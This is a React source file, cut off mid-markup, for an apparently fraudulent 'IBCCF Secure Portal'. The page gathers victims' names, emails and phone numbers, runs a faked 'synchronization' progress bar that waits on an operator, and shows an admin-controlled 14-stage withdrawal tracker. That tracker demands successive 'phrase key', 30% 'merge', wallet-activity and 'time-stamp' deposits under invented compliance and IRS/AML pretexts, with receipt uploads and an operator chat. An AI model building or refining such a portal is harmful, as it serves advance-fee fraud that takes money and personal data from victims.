import React, { useState, useEffect, useRef } from "react";
import { Button } from "@/components/ui/button";
import { Card, CardContent, CardFooter, CardHeader, CardTitle } from "@/components/ui/card";
import { Dialog, DialogContent, DialogDescription, DialogFooter, DialogHeader, DialogTitle } from "@/components/ui/dialog";
import { Input } from "@/components/ui/input";
import { Badge } from "@/components/ui/badge";
import { ScrollArea } from "@/components/ui/scroll-area";
import { Textarea } from "@/components/ui/textarea";
import { ShieldCheck, Lock, CheckCircle2, Key, User, Mail, Phone, FolderOpen, FileText, History, ArrowLeft, MessageCircle, Send, X, AlertTriangle, Clock, CheckCircle, Upload, Image, ExternalLink, Wallet, Bell, Home, Copy, Moon, Sun, Download, Printer, TrendingUp, Shield } from "lucide-react";
import { motion, AnimatePresence } from "framer-motion";
import { useTheme } from "@/App";
import { useToast } from "@/hooks/use-toast";

interface Case {
  id: string;
  accessCode: string;
  status: 'created' | 'registered' | 'syncing' | 'active' | 'completed';
  userName?: string;
  userEmail?: string;
  userMobile?: string;
  vipStatus?: string;
  username?: string;
  withdrawalAmount?: string;
  withdrawalBatches?: string;
  physilocal0?: string;
  depositAddress?: string;
  profileRedirectUrl?: string;
  hasRequirements?: boolean;
  letterSent?: boolean;
  landingPage?: string;
  showWithdrawalProgress?: boolean;
  withdrawalStage?: string;
  activityDepositAmount?: string;
  phraseKeyDepositAmount?: string;
  phraseKeyMergeDeposit?: string;
  activityWalletRequirement?: string;
  phraseKeyCertificateSent?: boolean;
  submissionUrl?: string;
}

interface CaseLetter {
  headline?: string;
  introduction?: string;
  bodyContent?: string;
  footerNote?: string;
  complianceReference?: string;
  optionATitle?: string;
  optionADescription?: string;
  optionAAmount?: string;
  optionAFrequency?: string;
  optionABatches?: string;
  optionAKeyCost?: string;
  optionATotalRequirement?: string;
  optionATotalAmount?: string;
  optionAFilelocoId?: string;
  optionBTitle?: string;
  optionBDescription?: string;
  optionBAmount?: string;
  optionBFrequency?: string;
  optionBBatches?: string;
  optionBKeyCost?: string;
  optionBTotalRequirement?: string;
  optionBTotalAmount?: string;
  optionBFilelocoId?: string;
  phraseKeyRequirements?: string;
  complianceNotice?: string;
  scheduledFor?: string;
  expiresAt?: string;
}

interface Submission {
  id: number;
  caseId: string;
  selectedOption: string;
  notes?: string;
  userName?: string;
  userEmail?: string;
  withdrawalAmount?: string;
  withdrawalBatches?: string;
  submittedAt: string;
}

interface ChatMessage {
  id: number;
  caseId: string;
  sender: 'admin' | 'user';
  message: string;
  isRead: string;
  createdAt: string;
}

interface AdminMessage {
  id: number;
  caseId: string;
  category: 'urgent' | 'processing' | 'resolved';
  title: string;
  body: string;
  isRead: boolean;
  createdAt: string;
}

interface DepositReceipt {
  id: number;
  caseId: string;
  imageData?: string;
  fileName?: string;
  notes?: string;
  status: string;
  uploadedAt: string;
}

const playNotificationSound = () => {
  const audioContext = new (window.AudioContext || (window as any).webkitAudioContext)();
  const oscillator = audioContext.createOscillator();
  const gainNode = audioContext.createGain();
  
  oscillator.connect(gainNode);
  gainNode.connect(audioContext.destination);
  
  oscillator.frequency.setValueAtTime(800, audioContext.currentTime);
  oscillator.frequency.setValueAtTime(600, audioContext.currentTime + 0.1);
  oscillator.frequency.setValueAtTime(800, audioContext.currentTime + 0.2);
  
  gainNode.gain.setValueAtTime(0.3, audioContext.currentTime);
  gainNode.gain.exponentialRampToValueAtTime(0.01, audioContext.currentTime + 0.3);
  
  oscillator.start(audioContext.currentTime);
  oscillator.stop(audioContext.currentTime + 0.3);
};

export default function SecurePortal() {
  const [viewState, setViewState] = useState<'login' | 'register' | 'sync' | 'dashboard' | 'letter' | 'messages' | 'submissions' | 'success' | 'deposit' | 'timeline'>('login');
  
  const [currentCase, setCurrentCase] = useState<Case | null>(null);
  const [letterContent, setLetterContent] = useState<CaseLetter | null>(null);
  const [submissions, setSubmissions] = useState<Submission[]>([]);
  const [accessCode, setAccessCode] = useState("");
  
  const [regName, setRegName] = useState("");
  const [regEmail, setRegEmail] = useState("");
  const [regMobile, setRegMobile] = useState("");
  
  const [syncProgress, setSyncProgress] = useState(0);
  const [syncStatusText, setSyncStatusText] = useState("Initializing secure handshake...");
  
  const [selectedOption, setSelectedOption] = useState<"A" | "B" | null>(null);
  const [isConfirming, setIsConfirming] = useState(false);
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [lastSubmission, setLastSubmission] = useState<Submission | null>(null);
  
  const [isChatOpen, setIsChatOpen] = useState(false);
  const [chatMessages, setChatMessages] = useState<ChatMessage[]>([]);
  const [newMessage, setNewMessage] = useState("");
  const [unreadCount, setUnreadCount] = useState(0);
  const [isSendingMessage, setIsSendingMessage] = useState(false);
  const chatScrollRef = useRef<HTMLDivElement>(null);
  const lastMessageCountRef = useRef(0);
  const isInitialLoadRef = useRef(true);
  
  // Admin messages
  const [adminMessages, setAdminMessages] = useState<AdminMessage[]>([]);
  const [selectedMessage, setSelectedMessage] = useState<AdminMessage | null>(null);
  const [unreadAdminMessages, setUnreadAdminMessages] = useState(0);
  
  // Deposit receipts
  const [depositReceipts, setDepositReceipts] = useState<DepositReceipt[]>([]);
  const [uploadingReceipt, setUploadingReceipt] = useState(false);
  const [receiptNotes, setReceiptNotes] = useState("");
  const fileInputRef = useRef<HTMLInputElement>(null);
  
  // User feedback state
  const [isFeedbackOpen, setIsFeedbackOpen] = useState(false);
  const [feedbackRating, setFeedbackRating] = useState(0);
  const [feedbackComment, setFeedbackComment] = useState("");
  const [isSubmittingFeedback, setIsSubmittingFeedback] = useState(false);
  const [hasSubmittedFeedback, setHasSubmittedFeedback] = useState(false);
  
  const { toast } = useToast();
  const { theme, toggleTheme } = useTheme();

  // Auto-login from sessionStorage (when redirected from /verify)
  useEffect(() => {
    const storedAccessCode = sessionStorage.getItem("caseAccessCode");
    if (storedAccessCode && viewState === 'login') {
      (async () => {
        try {
          const response = await fetch(`/api/cases/access/${storedAccessCode}`);
          if (response.ok) {
            const foundCase = await response.json();
            setCurrentCase(foundCase);
            setAccessCode(storedAccessCode);
            
            const landingPage = foundCase.landingPage || 'dashboard';
            if (foundCase.status === 'active') setViewState(landingPage as any);
            else if (foundCase.status === 'syncing') setViewState('sync');
            else if (foundCase.status === 'completed') setViewState(landingPage as any);
            else setViewState('register');
          }
        } catch (error) {
          console.error('Failed to auto-login:', error);
        }
      })();
    }
  }, []);

  // Session timeout after 3 minutes of inactivity
  useEffect(() => {
    if (viewState === 'login' || viewState === 'register') return;

    let timeoutId: NodeJS.Timeout;

    const resetTimeout = () => {
      if (timeoutId) clearTimeout(timeoutId);
      timeoutId = setTimeout(() => {
        setViewState('login');
        setCurrentCase(null);
        setAccessCode("");
        toast({ title: "Session Expired", description: "You have been logged out due to inactivity." });
      }, 3 * 60 * 1000); // 3 minutes
    };

    const handleActivity = () => resetTimeout();

    // Add activity listeners
    window.addEventListener('mousemove', handleActivity);
    window.addEventListener('keypress', handleActivity);
    window.addEventListener('click', handleActivity);

    resetTimeout();

    return () => {
      window.removeEventListener('mousemove', handleActivity);
      window.removeEventListener('keypress', handleActivity);
      window.removeEventListener('click', handleActivity);
      if (timeoutId) clearTimeout(timeoutId);
    };
  }, [viewState, toast]);

  // Load all data when case becomes active
  useEffect(() => {
    if (currentCase && viewState !== 'login' && viewState !== 'register' && viewState !== 'sync') {
      loadAllData();
    }
  }, [currentCase, viewState]);

  const loadAllData = async () => {
    if (!currentCase) return;
    
    try {
      const [letterRes, submissionsRes, adminMsgRes, receiptsRes] = await Promise.all([
        fetch(`/api/cases/${currentCase.id}/letter`),
        fetch(`/api/cases/${currentCase.id}/submissions`),
        fetch(`/api/cases/${currentCase.id}/admin-messages`),
        fetch(`/api/cases/${currentCase.id}/deposit-receipts`)
      ]);
      
      if (letterRes.ok) {
        const data = await letterRes.json();
        setLetterContent(data);
      }
      
      if (submissionsRes.ok) {
        const data = await submissionsRes.json();
        setSubmissions(data);
      }
      
      if (adminMsgRes.ok) {
        const data = await adminMsgRes.json();
        setAdminMessages(data);
        const unread = data.filter((m: AdminMessage) => !m.isRead).length;
        setUnreadAdminMessages(unread);
      }
      
      if (receiptsRes.ok) {
        const data = await receiptsRes.json();
        setDepositReceipts(data);
      }
    } catch (error) {
      console.error('Failed to load data:', error);
    }
  };

  // Chat message polling
  useEffect(() => {
    if (!currentCase || viewState === 'login' || viewState === 'register') return;

    const pollMessages = async () => {
      try {
        const res = await fetch(`/api/cases/${currentCase.id}/messages`);
        if (res.ok) {
          const messages = await res.json();
          setChatMessages(messages);
          
          const adminMessages = messages.filter((m: ChatMessage) => m.sender === 'admin' && m.isRead === 'false');
          setUnreadCount(adminMessages.length);
          
          // Only show notifications after initial load
          if (!isInitialLoadRef.current && messages.length > lastMessageCountRef.current) {
            const latestMessage = messages[messages.length - 1];
            if (latestMessage.sender === 'admin' && !isChatOpen) {
              playNotificationSound();
              toast({ title: "New Message", description: "You have a new message from support." });
            }
          }
          lastMessageCountRef.current = messages.length;
          
          // Mark initial load complete
          if (isInitialLoadRef.current) {
            isInitialLoadRef.current = false;
          }
        }
      } catch (error) {
        console.error('Failed to poll messages:', error);
      }
    };

    pollMessages();
    const interval = setInterval(pollMessages, 3000);
    return () => clearInterval(interval);
  }, [currentCase, viewState, isChatOpen, toast]);

  // Scroll to bottom when chat opens or new message
  useEffect(() => {
    if (chatScrollRef.current) {
      chatScrollRef.current.scrollTop = chatScrollRef.current.scrollHeight;
    }
  }, [chatMessages, isChatOpen]);

  // Mark messages as read when chat opens
  useEffect(() => {
    if (isChatOpen && currentCase && unreadCount > 0) {
      fetch(`/api/cases/${currentCase.id}/messages/read`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ sender: 'admin' })
      }).then(() => setUnreadCount(0));
    }
  }, [isChatOpen, currentCase, unreadCount]);

  const sendMessage = async () => {
    if (!newMessage.trim() || !currentCase || isSendingMessage) return;
    
    setIsSendingMessage(true);
    try {
      const res = await fetch(`/api/cases/${currentCase.id}/messages`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ sender: 'user', message: newMessage.trim() })
      });
      
      if (res.ok) {
        const msg = await res.json();
        setChatMessages(prev => [...prev, msg]);
        setNewMessage("");
      }
    } catch (error) {
      toast({ variant: "destructive", title: "Error", description: "Failed to send message." });
    }
    setIsSendingMessage(false);
  };

  // Submit user feedback
  const submitFeedback = async () => {
    if (!currentCase || feedbackRating === 0) return;
    
    setIsSubmittingFeedback(true);
    try {
      const res = await fetch('/api/user-feedback', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          caseId: currentCase.id,
          rating: feedbackRating,
          comment: feedbackComment.trim() || null,
          category: 'general'
        })
      });
      
      if (res.ok) {
        setHasSubmittedFeedback(true);
        setIsFeedbackOpen(false);
        setFeedbackRating(0);
        setFeedbackComment("");
        toast({
          title: "Feedback Submitted",
          description: "Thank you for your feedback!",
          className: "bg-green-50 border-green-200 text-green-900",
        });
      } else {
        throw new Error('Failed to submit feedback');
      }
    } catch (error) {
      toast({ variant: "destructive", title: "Error", description: "Failed to submit feedback." });
    }
    setIsSubmittingFeedback(false);
  };

  // Polling for sync status
  useEffect(() => {
    if (viewState !== 'sync' || !currentCase) return;

    const interval = setInterval(async () => {
      try {
        const response = await fetch(`/api/cases/access/${currentCase.accessCode}`);
        if (response.ok) {
          const updatedCase = await response.json();
          
          if (updatedCase.status === 'active') {
            setCurrentCase(updatedCase);
            setSyncProgress(100);
            setSyncStatusText("Synchronization Complete.");
            const landingPage = updatedCase.landingPage || 'dashboard';
            setTimeout(() => setViewState(landingPage as any), 1000);
          }
        }
      } catch (error) {
        console.error('Failed to poll case status:', error);
      }
    }, 2000);

    return () => clearInterval(interval);
  }, [viewState, currentCase]);

  const handleLogin = async (e: React.FormEvent) => {
    e.preventDefault();
    
    try {
      const response = await fetch(`/api/cases/access/${accessCode}`);
      
      if (response.ok) {
        const foundCase = await response.json();
        setCurrentCase(foundCase);
        
        const landingPage = foundCase.landingPage || 'dashboard';
        if (foundCase.status === 'active') setViewState(landingPage as any);
        else if (foundCase.status === 'syncing') setViewState('sync');
        else if (foundCase.status === 'completed') setViewState(landingPage as any);
        else setViewState('register');
        
        toast({
          title: "Identity Verified",
          description: "Secure session established.",
          className: "bg-green-50 border-green-200 text-green-900",
        });
      } else {
        toast({
          variant: "destructive",
          title: "Access Denied",
          description: "Invalid clearance code provided.",
        });
      }
    } catch (error) {
      toast({
        variant: "destructive",
        title: "Connection Error",
        description: "Unable to verify credentials.",
      });
    }
  };

  const handleRegister = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!currentCase) return;

    try {
      const response = await fetch(`/api/cases/${currentCase.id}`, {
        method: 'PATCH',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          status: 'syncing',
          userName: regName,
          userEmail: regEmail,
          userMobile: regMobile
        })
      });

      if (response.ok) {
        const updatedCase = await response.json();
        setCurrentCase(updatedCase);
        setViewState('sync');
        startSyncSimulation();
      } else {
        toast({
          variant: "destructive",
          title: "Registration Failed",
          description: "Unable to complete registration.",
        });
      }
    } catch (error) {
      toast({
        variant: "destructive",
        title: "Connection Error",
        description: "Unable to save registration.",
      });
    }
  };

  const startSyncSimulation = () => {
    let progress = 0;
    const interval = setInterval(() => {
      progress += 5;
      if (progress <= 30) setSyncStatusText("Account phrase key generation process successfully started...");
      else if (progress <= 60) setSyncStatusText("File of customer is now being sorted...");
      else if (progress <= 90) setSyncStatusText("Account information is now being synchronised...");
      else {
        setSyncStatusText("Waiting for Final Clearance from ISO-D Secretariat...");
        clearInterval(interval);
      }
      setSyncProgress(Math.min(progress, 90));
    }, 800);
  };

  const handleSelect = (option: "A" | "B") => {
    setSelectedOption(option);
    setIsConfirming(true);
  };

  const handleSubmit = async () => {
    setIsSubmitting(true);

    if (currentCase && selectedOption) {
      try {
        const response = await fetch(`/api/cases/${currentCase.id}/submissions`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            selectedOption: selectedOption
          })
        });

        if (response.ok) {
          const submission = await response.json();
          setLastSubmission(submission);
          setIsSubmitting(false);
          setIsConfirming(false);
          setViewState('success');
        } else {
          toast({
            variant: "destructive",
            title: "Submission Failed",
            description: "Unable to submit selection.",
          });
          setIsSubmitting(false);
        }
      } catch (error) {
        toast({
          variant: "destructive",
          title: "Connection Error",
          description: "Unable to submit selection.",
        });
        setIsSubmitting(false);
      }
    }
  };

  const markAdminMessageAsRead = async (messageId: number) => {
    try {
      await fetch(`/api/admin-messages/${messageId}/read`, { method: 'POST' });
      setAdminMessages(prev => prev.map(m => m.id === messageId ? { ...m, isRead: true } : m));
      setUnreadAdminMessages(prev => Math.max(0, prev - 1));
    } catch (error) {
      console.error('Failed to mark message as read:', error);
    }
  };

  const handleFileUpload = async (event: React.ChangeEvent<HTMLInputElement>) => {
    const file = event.target.files?.[0];
    if (!file || !currentCase) return;

    setUploadingReceipt(true);
    
    try {
      const reader = new FileReader();
      reader.onload = async (e) => {
        const base64Data = e.target?.result as string;
        
        const response = await fetch(`/api/cases/${currentCase.id}/deposit-receipts`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            imageData: base64Data,
            fileName: file.name,
            notes: receiptNotes
          })
        });

        if (response.ok) {
          const receipt = await response.json();
          setDepositReceipts(prev => [receipt, ...prev]);
          setReceiptNotes("");
          toast({ title: "Receipt Uploaded", description: "Your deposit receipt has been submitted for review." });
        } else {
          toast({ variant: "destructive", title: "Upload Failed", description: "Unable to upload receipt." });
        }
        setUploadingReceipt(false);
      };
      reader.readAsDataURL(file);
    } catch (error) {
      toast({ variant: "destructive", title: "Upload Error", description: "Failed to process file." });
      setUploadingReceipt(false);
    }
  };

  const hasUrgentMessages = adminMessages.some(m => m.category === 'urgent' && !m.isRead);

  // LOGIN VIEW
  if (viewState === 'login') {
    return (
      <div className="min-h-screen bg-slate-900 flex items-center justify-center p-4 font-sans">
        <motion.div initial={{ opacity: 0, scale: 0.95 }} animate={{ opacity: 1, scale: 1 }} className="max-w-md w-full">
          <div className="text-center mb-8">
            <div className="w-16 h-16 mx-auto mb-4 rounded-full bg-[#004182]/20 flex items-center justify-center" data-testid="img-logo">
              <Shield className="h-10 w-10 text-[#004182]" />
            </div>
            <h1 className="text-xl font-bold text-white tracking-wider">SECURE GATEWAY ACCESS</h1>
            <p className="text-slate-400 text-xs uppercase tracking-widest mt-1">Account Integrity Division</p>
          </div>
          <Card className="bg-slate-950 border-slate-800 shadow-2xl">
            <CardHeader>
              <CardTitle className="text-white text-center flex items-center justify-center gap-2">
                <Lock className="w-4 h-4 text-blue-500" /> Verification Required
              </CardTitle>
            </CardHeader>
            <CardContent>
              <form onSubmit={handleLogin} className="space-y-4">
                <div className="space-y-2">
                  <label className="text-xs font-medium text-slate-400 uppercase">Compliance Clearance Reference</label>
                  <div className="relative">
                    <Key className="absolute left-3 top-2.5 h-4 w-4 text-slate-500" />
                    <Input 
                      type="password" 
                      placeholder="Enter Access Code" 
                      className="pl-9 bg-slate-900 border-slate-800 text-white placeholder:text-slate-600 focus:ring-blue-500"
                      value={accessCode}
                      onChange={(e) => setAccessCode(e.target.value)}
                      data-testid="input-access-code"
                    />
                  </div>
                </div>
                <Button type="submit" className="w-full bg-blue-600 hover:bg-blue-700 text-white" data-testid="button-login">Verify Identity</Button>
              </form>
            </CardContent>
            <CardFooter className="border-t border-slate-800 pt-4 pb-6 flex justify-center">
              <div className="flex items-center gap-2 text-[10px] text-slate-500 uppercase tracking-wider">
                 <ShieldCheck className="w-3 h-3" /> 256-bit SSL Encrypted
              </div>
            </CardFooter>
          </Card>
        </motion.div>
      </div>
    );
  }

  // REGISTER VIEW
  if (viewState === 'register') {
    return (
      <div className="min-h-screen bg-slate-900 flex items-center justify-center p-4 font-sans">
        <motion.div initial={{ opacity: 0, x: 20 }} animate={{ opacity: 1, x: 0 }} className="max-w-md w-full">
          <Card className="bg-slate-950 border-slate-800 shadow-2xl">
            <CardHeader>
              <CardTitle className="text-white">Identity Verification</CardTitle>
              <p className="text-slate-400 text-sm mt-1">Please confirm your contact details for the secure ledger.</p>
            </CardHeader>
            <CardContent>
              <form onSubmit={handleRegister} className="space-y-4">
                <div className="space-y-2">
                  <label className="text-xs font-medium text-slate-400 uppercase">Full Legal Name</label>
                  <div className="relative">
                    <User className="absolute left-3 top-2.5 h-4 w-4 text-slate-500" />
                    <Input required value={regName} onChange={e => setRegName(e.target.value)} className="pl-9 bg-slate-900 border-slate-800 text-white" placeholder="Your full legal name" data-testid="input-name" />
                  </div>
                </div>
                <div className="space-y-2">
                  <label className="text-xs font-medium text-slate-400 uppercase">Email Address</label>
                  <div className="relative">
                    <Mail className="absolute left-3 top-2.5 h-4 w-4 text-slate-500" />
                    <Input required type="email" value={regEmail} onChange={e => setRegEmail(e.target.value)} className="pl-9 bg-slate-900 border-slate-800 text-white" placeholder="name@example.com" data-testid="input-email" />
                  </div>
                </div>
                <div className="space-y-2">
                  <label className="text-xs font-medium text-slate-400 uppercase">Mobile Number</label>
                  <div className="relative">
                    <Phone className="absolute left-3 top-2.5 h-4 w-4 text-slate-500" />
                    <Input required type="tel" value={regMobile} onChange={e => setRegMobile(e.target.value)} className="pl-9 bg-slate-900 border-slate-800 text-white" placeholder="Your contact number" data-testid="input-mobile" />
                  </div>
                </div>
                <Button type="submit" className="w-full bg-blue-600 hover:bg-blue-700 text-white mt-4" data-testid="button-register">
                  Proceed to Secure Synchronization
                </Button>
              </form>
            </CardContent>
          </Card>
        </motion.div>
      </div>
    );
  }

  // SYNC VIEW
  if (viewState === 'sync') {
    return (
      <div className="min-h-screen bg-slate-900 flex items-center justify-center p-4 font-sans">
        <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }} className="max-w-md w-full text-center">
          <div className="mb-8 relative">
             <div className="w-24 h-24 rounded-full border-4 border-blue-500/30 border-t-blue-500 animate-spin mx-auto"></div>
             <div className="absolute inset-0 flex items-center justify-center">
               <Lock className="w-8 h-8 text-blue-500" />
             </div>
          </div>
          
          <h2 className="text-2xl font-bold text-white mb-2">Synchronizing Account</h2>
          <p className="text-slate-400 text-sm mb-8 h-6">{syncStatusText}</p>
          
          <div className="bg-slate-800 rounded-full h-2 mb-2 overflow-hidden">
            <motion.div 
              className="h-full bg-blue-500" 
              initial={{ width: "0%" }}
              animate={{ width: `${syncProgress}%` }}
              transition={{ duration: 0.5 }}
            />
          </div>
          <div className="flex justify-between text-xs text-slate-500 font-mono">
            <span>ISO-D PROTOCOL</span>
            <span>{syncProgress}%</span>
          </div>

          {syncProgress >= 90 && (
             <div className="mt-8 p-4 bg-amber-500/10 border border-amber-500/20 rounded text-amber-400 text-xs animate-pulse">
               Wait for administrative clearance...
             </div>
          )}
        </motion.div>
      </div>
    );
  }

  // DASHBOARD VIEW
  if (viewState === 'dashboard') {
    const urgentMessages = adminMessages.filter(m => m.category === 'urgent');
    const processingMessages = adminMessages.filter(m => m.category === 'processing');
    const resolvedMessages = adminMessages.filter(m => m.category === 'resolved');

    return (
      <div className="min-h-screen bg-gradient-to-br from-slate-50 via-blue-50/30 to-slate-50">
        {/* Header with Glass Effect */}
        <nav className="bg-gradient-to-r from-slate-900 via-blue-900 to-slate-900 text-white shadow-2xl relative overflow-hidden">
          <div className="absolute inset-0 bg-[linear-gradient(to_right,transparent,rgba(255,255,255,0.05),transparent)]"></div>
          <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-4 relative">
            <div className="flex justify-between items-center">
              <div className="flex items-center gap-4">
                <div className="relative">
                  <div className="absolute inset-0 bg-blue-500 blur-lg opacity-50 rounded-full"></div>
                  <div className="w-12 h-12 rounded-full bg-white/20 flex items-center justify-center relative">
                    <Shield className="h-7 w-7 text-white" />
                  </div>
                </div>
                <div>
                  <h1 className="font-bold text-lg tracking-wide">IBCCF SECURE PORTAL</h1>
                  <div className="flex items-center gap-2">
                    <span className="w-2 h-2 bg-green-400 rounded-full animate-pulse"></span>
                    <p className="text-xs text-blue-200 uppercase tracking-wider">Member Dashboard</p>
                  </div>
                </div>
              </div>
              <div className="flex items-center gap-4">
                {hasUrgentMessages && (
                  <motion.div 
                    animate={{ scale: [1, 1.05, 1] }}
                    transition={{ repeat: Infinity, duration: 2 }}
                    className="flex items-center gap-2 bg-gradient-to-r from-red-500 to-red-600 px-4 py-1.5 rounded-full text-sm font-bold shadow-lg"
                  >
                    <AlertTriangle className="w-4 h-4" />
                    URGENT
                  </motion.div>
                )}
                <Button
                    variant="ghost"
                    size="sm"
                    className="text-white hover:bg-white/10 border border-white/20 hover:border-white/40 transition-all"
                    onClick={toggleTheme}
                    data-testid="button-theme-toggle"
                  >
                    {theme === 'dark' ? <Sun className="w-4 h-4" /> : <Moon className="w-4 h-4" />}
                  </Button>
                <Button 
                  variant="ghost" 
                  size="sm" 
                  className="text-white hover:bg-white/10 border border-white/20 hover:border-white/40 transition-all"
                  onClick={() => { setViewState('login'); setCurrentCase(null); }}
                  data-testid="button-logout"
                >
                  Sign Out
                </Button>
              </div>
            </div>
          </div>
        </nav>

        <main className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-8">
          {/* Welcome Section with Status Bar */}
          <motion.div initial={{ opacity: 0, y: 20 }} animate={{ opacity: 1, y: 0 }} className="mb-8">
            <div className="flex flex-col md:flex-row md:items-center md:justify-between gap-4">
              <div>
                <h2 className="text-3xl font-bold text-slate-900 mb-1">
                  Welcome back, <span className="bg-gradient-to-r from-blue-600 to-blue-800 bg-clip-text text-transparent">{currentCase?.userName || 'Member'}</span>
                </h2>
                <div className="flex items-center gap-3 text-slate-600">
                  <span className="flex items-center gap-1.5">
                    <ShieldCheck className="w-4 h-4 text-green-500" />
                    Verified Account
                  </span>
                  <span className="text-slate-300">•</span>
                  <span className="font-mono text-sm">IBCCF-{currentCase?.accessCode}</span>
                </div>
              </div>
              <div className="flex items-center gap-3">
                <div className="bg-white rounded-lg shadow-sm border border-slate-200 px-4 py-2 text-center">
                  <p className="text-xs text-slate-500 uppercase tracking-wider">VIP Status</p>
                  <p className="font-bold text-blue-600">{currentCase?.vipStatus || 'Standard'}</p>
                </div>
                <div className="bg-white rounded-lg shadow-sm border border-slate-200 px-4 py-2 text-center">
                  <p className="text-xs text-slate-500 uppercase tracking-wider">Account</p>
                  <p className="font-bold text-green-600">Active</p>
                </div>
              </div>
            </div>
          </motion.div>

          {/* Withdrawal Progress Tracker - Only shown when admin enables it */}
          {currentCase?.showWithdrawalProgress && (
            <motion.div 
              initial={{ opacity: 0, y: 20 }} 
              animate={{ opacity: 1, y: 0 }}
              className="mb-8"
            >
              <Card className="border-2 border-blue-200 shadow-lg overflow-hidden">
                <CardHeader className="bg-gradient-to-r from-blue-600 via-blue-700 to-indigo-700 text-white">
                  <CardTitle className="flex items-center gap-3">
                    <div className="w-10 h-10 bg-white/20 rounded-full flex items-center justify-center">
                      <TrendingUp className="w-5 h-5" />
                    </div>
                    <div>
                      <span className="text-lg font-bold">Withdrawal Progress</span>
                      <p className="text-blue-200 text-sm font-normal">Real-time status of your withdrawal request</p>
                    </div>
                  </CardTitle>
                </CardHeader>
                <CardContent className="pt-6 pb-8 px-0">
                  {(() => {
                    const stages = [
                      { id: 1, label: "Phrase Key Deposit Received", icon: "💰", description: "Phrase key deposit successfully confirmed on ledger" },
                      { id: 2, label: "Generating Secure Phrase Key", icon: "⚙️", description: "Phrase key creation underway" },
                      { id: 3, label: "Phrase Key Approved & Available", icon: "🔐", description: "Phrase key approved and delivered to Secure Message Center" },
                      { id: 4, label: "Withdrawal Process Initiated", icon: "🚀", description: "Withdrawal flow activated" },
                      { id: 5, label: "Initial Deposit Verification", icon: "✅", description: "Deposit verification in progress" },
                      { id: 6, label: "Phrase Key Verification", icon: "🔑", description: "Phrase key validation in progress" },
                      { id: 7, label: "Phrase Key Merge Deposit Required", icon: "📊", description: currentCase?.phraseKeyMergeDeposit ? `Required: ${currentCase.phraseKeyMergeDeposit} (30% merge deposit)` : "Awaiting merge deposit calculation" },
                      { id: 8, label: "Financial Department Verification", icon: "🏦", description: "Compliance and financial review" },
                      { id: 9, label: "Mining Withdrawal for Final Clearance", icon: "⛏️", description: "Blockchain confirmation and internal clearance" },
                      { id: 10, label: "Blockchain Activity Verification", icon: "🔗", description: currentCase?.activityWalletRequirement ? `Required: ${currentCase.activityWalletRequirement} balance in receiving wallet` : "Wallet activity verification in progress" },
                      { id: 11, label: "IRS / International AML Verification", icon: "🏛️", description: "Regulatory compliance checks in progress" },
                      { id: 12, label: "Final Withdrawal Processing", icon: "📋", description: "Preparing funds for release" },
                      { id: 13, label: "Withdrawal Successfully Released", icon: "🎉", description: "Funds released to designated wallet" },
                      { id: 14, label: "Time-Stamp Deposit for Final Delivery", icon: "⏰", description: "Final delivery confirmation" },
                    ];
                    const currentStage = parseInt(currentCase?.withdrawalStage || '1');
                    const totalStages = 14;
                    const completedStages = Math.max(0, currentStage - 1);
                    const progressPercent = Math.round((completedStages / totalStages) * 100);
                    
                    return (
                      <div className="space-y-6">
                        {/* Progress Bar */}
                        <div className="relative px-6">
                          <div className="flex justify-between mb-2">
                            <span className="text-sm font-medium text-slate-600">Progress</span>
                            <span className="text-sm font-bold text-blue-600">{progressPercent}%</span>
                          </div>
                          <div className="h-3 bg-slate-200 rounded-full overflow-hidden">
                            <motion.div 
                              className="h-full bg-gradient-to-r from-blue-500 via-blue-600 to-indigo-600 rounded-full"
                              initial={{ width: 0 }}
                              animate={{ width: `${progressPercent}%` }}
                              transition={{ duration: 1, ease: "easeOut" }}
                            />
                          </div>
                        </div>
                        
                        {/* Full-Width Horizontal Stepper - Completed stages shrink to icons, active expands */}
                        <div className="px-4 sm:px-6">
                          <div className="flex items-stretch w-full">
                            {stages.filter(s => s.id <= currentStage).map((stage, index, filteredStages) => {
                              const isCompleted = currentStage > stage.id;
                              const isCurrent = currentStage === stage.id;
                              const isFirst = index === 0;
                              const isLast = index === filteredStages.length - 1;
                              const arrowDepth = 10;
                              
                              const getClipPath = () => {
                                if (isFirst) return `polygon(0 0, calc(100% - ${arrowDepth}px) 0, 100% 50%, calc(100% - ${arrowDepth}px) 100%, 0 100%)`;
                                if (isLast) return `polygon(0 0, 100% 0, 100% 100%, 0 100%, ${arrowDepth}px 50%)`;
                                return `polygon(0 0, calc(100% - ${arrowDepth}px) 0, 100% 50%, calc(100% - ${arrowDepth}px) 100%, 0 100%, ${arrowDepth}px 50%)`;
                              };
                              
                              return (
                                <motion.div
                                  key={stage.id}
                                  layout
                                  initial={{ opacity: 0 }}
                                  animate={{ opacity: 1 }}
                                  transition={{ duration: 0.4, ease: "easeOut" }}
                                  className="overflow-hidden"
                                  style={{ 
                                    marginLeft: isFirst ? '0' : `-${arrowDepth}px`,
                                    flex: isCurrent ? '1 1 auto' : '0 0 auto',
                                    width: isCompleted ? '42px' : (isCurrent ? 'auto' : '42px'),
                                    minWidth: isCompleted ? '42px' : (isCurrent ? '180px' : '42px'),
                                    maxWidth: isCompleted ? '42px' : 'none'
                                  }}
                                  data-testid={`stage-${stage.id}`}
                                >
                                  <div 
                                    className={`relative flex items-center h-[60px] w-full ${
                                      isCompleted ? 'bg-green-500 justify-center' :
                                      isCurrent ? 'bg-blue-500' :
                                      'bg-slate-300 justify-center'
                                    }`}
                                    style={{ clipPath: getClipPath() }}
                                  >
                                    {/* Completed: Icon only */}
                                    {isCompleted && (
                                      <div className="flex items-center justify-center w-full">
                                        <CheckCircle className="w-5 h-5 text-white" />
                                      </div>
                                    )}
                                    
                                    {/* Active: Icon + Full details */}
                                    {isCurrent && (
